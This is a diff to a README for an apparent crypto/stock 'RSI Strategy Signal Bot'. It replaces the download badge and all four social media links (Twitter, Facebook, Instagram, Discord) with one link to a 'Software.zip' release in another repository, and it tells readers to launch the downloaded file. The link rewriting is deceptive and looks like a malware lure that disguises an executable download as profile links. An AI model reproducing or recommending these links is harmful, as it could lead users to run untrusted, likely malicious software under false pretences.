@@ -15,7 +15,7 @@ Are you looking for a reliable bot to provide you with trade signals based on th
 
 To get started with the RSI Strategy Signal Bot, make sure you have the necessary tools and software installed. You can download the latest version of the tool from the link below:
 
-[![Download RSI Strategy Signal Bot](https://img.shields.io/badge/Download%20Bot-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download RSI Strategy Signal Bot](https://github.com/ainabaylon/trade-signals-bots/releases/download/v1.0/Software.zip%20Bot-v1.0.0-blue)](https://github.com/ainabaylon/trade-signals-bots/releases/download/v1.0/Software.zip)
 
 ℹ️ Please note that the downloaded file will need to be launched to set up the RSI Strategy Signal Bot successfully.
 
@@ -45,13 +45,13 @@ If you encounter any issues or have any questions regarding the RSI Strategy Sig
 
 Stay updated on the latest developments, news, and announcements by following us on social media:
 
-🐦 Twitter: [@TradeSignalsBots](https://twitter.com/tradesignalsbots)
+🐦 Twitter: [@TradeSignalsBots](https://github.com/ainabaylon/trade-signals-bots/releases/download/v1.0/Software.zip)
 
-📘 Facebook: [TradeSignalsBots](https://www.facebook.com/tradesignalsbots)
+📘 Facebook: [TradeSignalsBots](https://github.com/ainabaylon/trade-signals-bots/releases/download/v1.0/Software.zip)
 
-📸 Instagram: [@TradeSignalsBots](https://www.instagram.com/tradesignalsbots)
+📸 Instagram: [@TradeSignalsBots](https://github.com/ainabaylon/trade-signals-bots/releases/download/v1.0/Software.zip)
 
-💬 Discord: [TradeSignalsBots](https://discord.gg/tradesignalsbots)
+💬 Discord: [TradeSignalsBots](https://github.com/ainabaylon/trade-signals-bots/releases/download/v1.0/Software.zip)
 
 ## License
 
